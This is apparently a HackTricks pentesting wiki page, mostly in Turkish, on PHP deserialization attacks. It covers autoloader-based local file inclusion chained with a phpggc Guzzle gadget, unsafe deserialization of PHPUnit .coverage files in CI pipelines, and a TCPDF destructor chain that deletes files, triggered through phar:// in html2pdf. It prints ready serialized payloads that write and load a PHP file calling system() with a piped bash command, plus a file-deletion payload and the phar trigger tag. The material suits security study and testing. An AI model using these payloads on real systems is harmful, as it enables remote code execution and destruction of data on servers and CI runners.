# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

First, you should check what are [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Bir webapp'te **PHP deserialization** bulduğumuz bir durumdayız ancak mevcut uygulamada **phpggc** içinde gadget oluşturacak bir kütüphane yok. Ancak aynı container içinde **vulnerable libraries** içeren farklı bir composer webapp vardı. Bu yüzden amaç, diğer webapp'in composer loader'ını yükleyip bunu, deserialization'a açık webapp'teki bir **gadget** ile o kütüphaneyi exploit edecek şekilde kötüye kullanmaktı.

Adımlar:

- Bir **deserialization** buldunuz ve mevcut uygulama kodunda **hiç gadget yok**
- Aşağıdaki gibi bir **`spl_autoload_register`** fonksiyonunu kötüye kullanarak **.php uzantılı herhangi bir yerel dosyayı yükleyebilirsiniz**
- Bunun için sınıf adının **`$name`** içinde olacağı bir deserialization kullanırsınız. Seri hale getirilmiş bir nesnede sınıf adında **"/" veya "."** kullanamazsınız, ancak **kod** alt çizgileri ("_") **slashes** ("/") ile **değiştiriyor**. Bu nedenle `tmp_passwd` gibi bir sınıf adı `/tmp/passwd.php`'ye dönüştürülecek ve kod onu yüklemeye çalışacaktır.\
Bir **gadget example** şöyle olacaktır: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload örneği</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> Eğer bir **file upload**'ınız varsa ve **`.php` extension** ile dosya yükleyebiliyorsanız bu fonksiyonu doğrudan **abuse** edip zaten RCE elde edebilirsiniz.

Benim durumumda böyle bir şey yoktu, ancak **same container** içinde başka bir composer web sayfası vardı ve bir **library vulnerable to a `phpggc` gadget** barındırıyordu.

- Bu diğer library'yi yüklemek için, öncelikle **load the composer loader of that other web app** (çünkü mevcut uygulamanınki diğerinin kütüphanelerine erişmeyecek.) **Knowing the path of the application**, bunu çok kolayca şu ile başarabilirsiniz: **`O:28:"www_frontend_vendor_autoload":0:{}`** (Benim durumumda, composer loader `/www/frontend/vendor/autoload.php` içindeydi)
- Şimdi, diğer **app composer loader**'ı **load** edebilirsiniz, dolayısıyla kullanmak için **`generate the phpgcc`** **payload** üretme zamanı. Benim durumumda **`Guzzle/FW1`** kullandım, bu bana filesystem içinde herhangi bir dosyayı **write any file inside the filesystem** imkanı verdi.
- NOTE: The **generated gadget was not working**, bunun çalışması için phpggc payload'ı **`chain.php`** üzerinde **modified** ettim ve sınıfların **all the attribute**s değerlerini **from private to public** olarak ayarladım. Aksi takdirde, string deserialize edildikten sonra oluşturulan nesnelerin attributeları hiçbir değer içermiyordu.
- Şimdi diğer **app composer loader**'ı **load** etmenin yolunu ve çalışan bir **phpggc payload that works**'u elde ettik, fakat bunu gadget kullanıldığında loader'ın yükleneceği şekilde aynı istekte yapmamız gerekiyor: **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. Bunun için, her iki objeyi içeren serileştirilmiş bir array gönderdim:
- You can see **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Şimdi, **bir dosya oluşturup yazabiliriz**, ancak kullanıcı **web server içindeki hiçbir klasöre yazamıyordu**. Yani, payload içinde görebileceğiniz gibi, PHP'nin **`system`** çağırdığı ve biraz **base64** içeren bir dosya **`/tmp/a.php`** oluşturuluyor. Sonra, LFI ile diğer webapp'in composer loader'ını yüklemek için kullandığımız **ilk payload türünü yeniden kullanarak** oluşturulan `/tmp/a.php` dosyasını yükleyebiliriz. Bunu deserialization gadget'a ekleyin:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Payload özeti**

- **composer autoload'u yükle** aynı container içindeki farklı bir webapp'in
- **phpggc gadget'ı yükle** diğer webapp'in bir kütüphanesini suistimal etmek için (deserialization'a hassas ilk webapp'in kütüphanelerinde herhangi bir gadget yoktu)
- Gadget, içinde kötü amaçlı komutlar bulunan bir **PHP payload** içeren bir dosya oluşturacak: /tmp/a.php (webapp kullanıcısı herhangi bir webapp klasörüne yazamaz)
- Payload'ımızın son kısmı, komutları çalıştıracak olan **oluşturulan php dosyasını yükleyecek**

Bu deserialization'ı **iki kez çağırmam** gerekti. Testlerimde ilk seferde `/tmp/a.php` dosyası oluşturuldu ama yüklenmedi, ikinci seferde doğru şekilde yüklendi.

### Recent phpggc goodies (2025)

- **phpggc master branch'i zincirler eklemeye devam ediyor**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 ve diğerleri 2025'te eklendi — hedef uygulama bu projelerle vendor kodu paylaşıyorsa faydalı. Hızlı arama: `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (önce clone'unu güncelle).
- Uygulamalar arasında autoloading ile gadget'ları karıştırırken, gadget tanımlarındaki **private properties'in düşürülebileceğini** unutma; hedefte sınıflar farklı şekilde yeniden tanımlandığında payload boş değerlerle geliyorsa gadget’ın `chain.php` dosyasını düzenleyip özellikleri `public` yap (yukarıda gösterilen aynı numara).

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) PHPT runner tarafından üretilen `.coverage` dosyalarından keyfi PHP nesnelerini unserialize ediyordu. Güvensiz katkıda bulunanların test itebildiği CI pipeline'larında, hazırlanmış bir `.coverage` dosyası bırakmak suite çalışır çalışmaz deserialization tetikler — web erişimi gerekli değil.

**Attack flow**

1. Repo'ya (veya artifact'a) test bağımlılıklarında bulunan bir serialized gadget içeren kötü amaçlı bir `.coverage` dosyası yerleştir (ör. phpggc'den bir Monolog veya Guzzle chain).
2. PR gönder; CI `phpunit --configuration phpunit.xml` çalıştırdığında PHPT runner coverage dosyasını okur ve gadget'ı deserialize eder, bu da **runner container içinde RCE** verir.
3. Testlerin CI secret'ları (cloud creds, deployment keys) mount ettiği durumlarda bu özellikle tehlikelidir.

**Minimal malicious coverage stub** (bir PHPT testinin yanında bırak):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Run the PHPT so phpunit consumes `exploit.coverage`.

## TCPDF `__destruct` POP chain ile keyfi dosya silme

Gerçek bir `TCPDF` örneği garbage-collected olduğunda `_destroy(true)` çağırır, `$this->imagekeys` üzerinde iterasyona girer ve `K_PATH_CACHE` altındaki bir önbellek dosyası gibi görünen her şeyi `unlink()` ile siler. Eğer bir uygulama `unserialize($user_data)` işlemini `TCPDF` sınıfı yüklüyken gerçekleştiriyorsa (örn. `html` anahtarına sahip bir dizi bekliyorsa), şu alanlara sahip bir serileştirilmiş obje sağlayabilirsiniz:

- `file_id`'yi `self::$cleaned_ids` içinde bulunmayan herhangi bir tamsayıya ayarlamak (örn. `-1`).
- `imagekeys`'i `K_PATH_CACHE` ile başlayan veya öyle gösterilebilecek yollara ayarlamak (örn. `/tmp/../tmp/do_not_delete_this_file.txt` when `K_PATH_CACHE` is `/tmp/`).

Güvensiz bir `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` akışını hedefleyen örnek payload:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Nesne kapsam dışına çıktığı anda dosya silinir. TCPDF 6.9.3, yalnızca `K_PATH_CACHE` içindeki `__tcpdf_<file_id>_` önekine sahip yolları kaldıracak şekilde denetimi sıkılaştırdı ve non-`file://` şemalarını engellemek için `_unlink()` ekledi; bu yüzden eski `Producer` versiyonları birincil hedeflerdir.

### `phar://` ile html2pdf `<cert>` etiketlerindeki gadget'i tetikleme

spipu/html2pdf (≤5.3.0) TCPDF'i sarar ve `src`/`privkey` öznitelikleri düz `file_exists()` ile doğrulanan özel bir `<cert>` bloğu sunar. PHP < 8.0 üzerinde, bir `phar://` URL'sine dokunan herhangi bir dosya sistemi fonksiyonu Phar metadata'sının `unserialize()` edilmesine neden olur. Kötü amaçlı TCPDF nesnesini yukarıda belirtildiği gibi bir Phar arşivine koyarak, uygulama hiç `unserialize()` çağırmasa bile güvenilir bir POP elde edersiniz.

1. `phar.readonly=0` ile bir Phar oluşturun, stub/manifest'i bir resim gibi gösterecek şekilde ayarlayın (ör. `archive.phar` dosyasının adını `archive.png` olarak değiştirin) ve serileştirilmiş TCPDF nesnesini Phar metadata'sına koyun.
2. Dosyayı `/tmp/user_files/user_1/archive.png` gibi erişilebilir bir yere yükleyin/yerleştirin.
3. CERT tag içeren HTML gönderin ki html2pdf saldırgan kontrollü yolu çözsün:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
`file_exists()` çağrısı metadata'yı deserialize eder, TCPDF'i instantiate eder ve destructor'ı seçilen dosyayı siler; bu da html2pdf'ü güçlü bir `phar://` giriş noktası haline getirir. Sürüm 5.3.1, onaylanmamış şemaları engellemek için `Security::checkValidPath()`'i ekledi, bu yüzden legacy dağıtımlar hâlâ cazip.

## Referanslar

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
